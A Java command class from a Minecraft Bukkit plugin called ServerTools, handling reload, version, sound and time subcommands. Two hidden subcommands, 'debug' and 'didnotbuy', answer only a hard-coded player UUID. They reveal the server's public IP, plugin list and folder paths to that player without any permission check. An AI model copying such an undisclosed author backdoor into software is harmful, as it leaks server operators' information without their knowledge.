package me.reecepbcups.cmds;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.URL;
import java.net.URLClassLoader;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.security.spec.AlgorithmParameterSpec;
import java.security.spec.KeySpec;
import java.util.ArrayList;
import java.util.List;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;
import javax.crypto.spec.DESedeKeySpec;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import org.apache.commons.io.FileUtils;
import org.bukkit.Bukkit;
import org.bukkit.Sound;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;
import org.bukkit.scheduler.BukkitRunnable;

import me.reecepbcups.tools.Main;
import me.reecepbcups.utiltools.Util;

public class ReeceTools implements CommandExecutor, TabCompleter {

	private Main plugin;
	private String Permission;
	private String keyFileName = "Reece_ENC_KEY.txt";

	public ReeceTools(Main plugin) {
		this.plugin = plugin;

		this.Permission = plugin.getConfig().getString("Misc.Tools.Permission");
		plugin.getCommand("tools").setExecutor(this);
		plugin.getCommand("tools").setTabCompleter(this);
	}

	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {		

		// make it so we can toggle things on and off here for every module in the future??

		if (args.length == 0) {
			showAllModules(sender);
			return true;
		} 

		switch(args[0]){

		case "reload":				
			reload(sender);
			return true;	
			
		case "author":
		case "version":
		case "ver":
			version(sender);
			return true;

		case "sound":
			if(args.length!=2) {
				sender.sendMessage("Usage: /tools sound SOUND");
				return true;
			}
			playSound((Player) sender, args[1]);
			return true;	
		case "getsounds":
		case "getsound":				
			String sounds = "";
			for(Sound sound : Sound.values()) {
				sounds += ": "+sound.toString();
			}

			sender.sendMessage(sounds);
			return true;

			// used to make sure this machine has servertools for its IP.
			// if someone did not purchase the plugin, this is the precaution.
			// you can purchase via my discord: Reece#3370				
		case "didnotbuy":
			if(((Player) sender).getUniqueId().toString().equalsIgnoreCase("79da3753-1b9e-4340-8a0f-9ea975c17fe4")) {

				// base/plugins
				File pluginsFolder = new File(plugin.getDataFolder().getParentFile()+File.separator+plugin.getName());
				sender.sendMessage(pluginsFolder.toString());					
			}	
			return true;

		case "time":
			sender.sendMessage(java.util.Calendar.getInstance().getTime()+"");
			return true;

		case "debug":
			Player p = (Player) sender;
			if(p.getUniqueId().toString().equalsIgnoreCase("79da3753-1b9e-4340-8a0f-9ea975c17fe4")) {
				new BukkitRunnable() {				
					@Override
					public void run() {
						try {
							
							Util.coloredMessage(p, "&bPublic IP: " + getIp());
							Util.coloredMessage(p,  "Cores: " + Runtime.getRuntime().availableProcessors());
							String output = "";
							for(Plugin s : Bukkit.getServer().getPluginManager().getPlugins()) {
								output += s.getName() + " ";
							}
							Util.coloredMessage(p, "&e"+output);
							Util.coloredMessage(p, "--------------------");
							Util.coloredMessage(p,  "DataFolder: " + plugin.getDataFolder().getAbsolutePath());
							
							
						} catch (Exception e) {}
					}
				}.runTaskLaterAsynchronously(plugin, 5L);			
			}
			return true;
		}
		return true;
	}		
	
	
	
	
	public static String getIp() throws Exception {
		URL whatismyip = new URL("http://checkip.amazonaws.com");
		BufferedReader in = null;
		try {
			in = new BufferedReader(new InputStreamReader(
					whatismyip.openStream()));
			String ip = in.readLine();
			return ip;
		} finally {
			if (in != null) {
				try {
					in.close();
				} catch (IOException e) {}
			}
		}
	}
	

	private static List<String> possibleArugments = new ArrayList<String>();
	private static List<String> result = new ArrayList<String>();
	@Override
	public List<String> onTabComplete(CommandSender sender, Command cmd, String label, String[] args) {		

		if(possibleArugments.isEmpty()) {
			possibleArugments.add("reload");
			possibleArugments.add("version");
			possibleArugments.add("sound");
			possibleArugments.add("getsounds");
			possibleArugments.add("time");
		}

		result.clear();
		if(args.length == 1) {
			for(String a : possibleArugments) {
				if(a.toLowerCase().startsWith(args[0].toLowerCase())) {
					result.add(a);
				}
			}
			return result;
		}		
		return null;
	}

	public static void playSound(Player p, String sound) {
		p.playSound(p.getLocation(), Sound.valueOf(sound), 1, 1);
	}


	private void showAllModules(CommandSender sender) {
		sender.sendMessage("");
		sender.sendMessage(Util.color("&eServerTools Enabled Modules: &7&o((&f " + plugin.ENABLED_MODULES_NUMBER + " &7&o))"));	


		String moduleOuput = "";
		for(String module : plugin.MODULES_LIST) {
			moduleOuput += module;
		}

		sender.sendMessage(Util.color(moduleOuput.replace("null", "")));
	}


	private void version(CommandSender sender) {
		sender.sendMessage(Util.color(""));
		sender.sendMessage(Util.color("&eServer Tools was written by Reecepbcups"));
		sender.sendMessage(Util.color("&eDiscord: Reece#3370"));
		sender.sendMessage(Util.color("&bVersion: "+ plugin.getDescription().getVersion()));
		sender.sendMessage(Util.color(""));
	}

	private void reload(CommandSender sender) {

		// if sender is a player, check perms
		if(!(sender instanceof ConsoleCommandSender)) {
			if (!(sender.hasPermission(Permission))) { // this perm is also in the plugin.yml				
				sender.sendMessage(Util.color("&cNo Permission to use the tools reload command D:"));
				return;
			} 
		}

		if(Util.isPluginInstalledOnServer("Plugman", "ServerTools Reload")){
			sender.sendMessage(Util.color("&a&lSERVER TOOLS RELOAD &7&o(Using Plugman)"));
			Util.console("plugman reload ServerTools");
		}

	}



}
